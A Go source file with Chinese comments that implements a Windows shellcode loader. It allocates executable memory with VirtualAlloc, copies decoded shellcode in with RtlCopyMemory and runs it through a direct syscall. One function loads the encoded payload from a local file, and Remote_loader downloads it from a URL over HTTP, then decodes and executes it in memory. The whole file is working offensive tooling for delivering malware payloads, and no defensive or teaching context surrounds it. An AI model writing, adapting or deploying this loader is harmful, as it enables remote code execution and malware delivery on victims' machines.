package tools

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")   //调用kernel32.dll
	ntdll         = syscall.MustLoadDLL("ntdll.dll")      //调用ntdll.dll
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc") //使用kernel32.dll调用ViretualAlloc函数
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")   //使用ntdll调用RtCopyMemory函数
)

func checkErr(err error) {
	if err != nil { //如果内存调用出现错误，可以报出
		if err.Error() != "The operation completed successfully." { //如果调用dll系统发出警告，但是程序运行成功，则不进行警报
			println(err.Error()) //报出具体错误
			os.Exit(1)
		}
	}
}

func original_loader(shellcode []byte) {
	//调用VirtualAlloc为shellcode申请一块内存
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	//调用RtlCopyMemory来将shellcode加载进内存当中
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	checkErr(err)
	//syscall来运行shellcode
	_, _, _ = syscall.SyscallN(addr, 0, 0, 0, 0)
}

func OriginalLoader(fp string) {
	encodeDataByte, err := os.ReadFile(fp)
	if err != nil {
		fmt.Printf("读取文件时出错: %v\n", err)
	}
	shellcode := Decode(encodeDataByte)
	original_loader(shellcode)
}

func Remote_loader(url string) []byte {
	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("error when getting remote connection")
		return nil
	}
	defer resp.Body.Close()
	encodeDataByte, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("error when getting remote connection")
		return nil
	}
	shellcode := Decode(encodeDataByte)
	original_loader(shellcode)
	return nil
}
